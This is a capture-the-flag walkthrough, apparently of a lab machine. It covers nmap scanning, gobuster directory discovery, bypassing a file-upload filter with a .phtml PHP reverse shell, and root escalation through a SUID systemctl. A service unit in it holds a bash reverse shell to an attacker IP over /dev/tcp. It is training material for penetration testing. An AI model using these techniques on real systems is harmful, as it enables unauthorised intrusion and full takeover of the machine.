## Reconnaissance

- Scan ports of the machine with given command `nmap -sV 10.10.65.81`
Output of the command:

```bash

```

- Question `how many ports are open?` Answer `6`
- Question `What version of the squid proxy is running on the machine?` Answer `3.5.12`
- Question `How many ports will Nmap scan if the flag -p-400 was used?` Answer `400`
- Question `What is the most likely operating system this machine is running?` Answer `Ubuntu`
- Question `What port is the web server running on?` Answer `3333`
- Question `What is the flag for enabling verbose mode using Nmap?` Answer `-v`

## Locating directories using Gobuster 

   
- Port 3333 is http server, So web interface looks like that http://10.10.65.81:3333
- We can run directory busting tool gobuster as per given command with our own wordlist `gobuster dir -u http://10.10.65.81:3333 -w /usr/share/wordlist/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt`
Output of the command:

- Question `What is the directory that has an upload form page?` Answer `/internal/`

## Compromise the Webserver 

- Question `What common file type you'd want to upload to exploit the server is blocked? Try a couple to find out.` Answer `.php`
- Run burpsuite as per instruction and user intruder. Use firefox extension, https://addons.mozilla.org/en-US/firefox/addon/burp-proxy-toggler-lite/
- Question `Run this attack, what extension is allowed?` Answer `.phtml`
- Now we need to make our shell with given instruction using https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php. Just replace ip to our netcat listening ip (tun0) and file extension to `.phtml`. Use `nc -lvnp 1234` to get shell.
- Now just upload the file and open http://10.10.65.81:3333/internal/uploads/ and click on the shell to get reverse shell.
- Question `What is the name of the user who manages the webserver?` Answer `bill`. Use `ls /home` command to get username.
- Question `What is the user flag?` Answer `********************************` (32 alphanumeric characters). Command used `cat /home/bill/user.txt`

## Privilege Escalation 

- To check suid permission files, we can use `find / -perm /4000 2> /dev/null`.
- Question `On the system, search for all SUID files. Which file stands out?` Answer `/bin/systemctl` Because systemctl don't have suid permission normally.
- Now we can start rooting the server.
- At first I created a file on my machine named ZishanAdThander.service (with my ip, you can user your ip)

```bash
[Unit]
Description=ZishanAdThandar

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.17.102.105/1337 0>&1'

[Install]
WantedBy=multi-user.target
```

- Now started web server on my machine using `python3 -m http.server 7860`
- On the reverse shell, moved to `/tmp` directory using `cd /tmp` command. Then uploaded the file with `wget http://10.17.102.105:7860/ZishanAdThandar.service` command.
- Now we can add the service using `/bin/systemctl enable /tmp/ZishanAdThandar.service` command on reverse shell.
- Started netcat listner on the given port with `nc -lvnp 1337`.
- Now we need can run the command `/bin/systemctl start ZishanAdThandar` to start the service and immediately we will get reverse shell as root on another netcat listner.
- Question `Become root and get the last flag (/root/root.txt)` Answer `********************************` (32 alphanumeric characters). Command used `cat /root/root.txt`
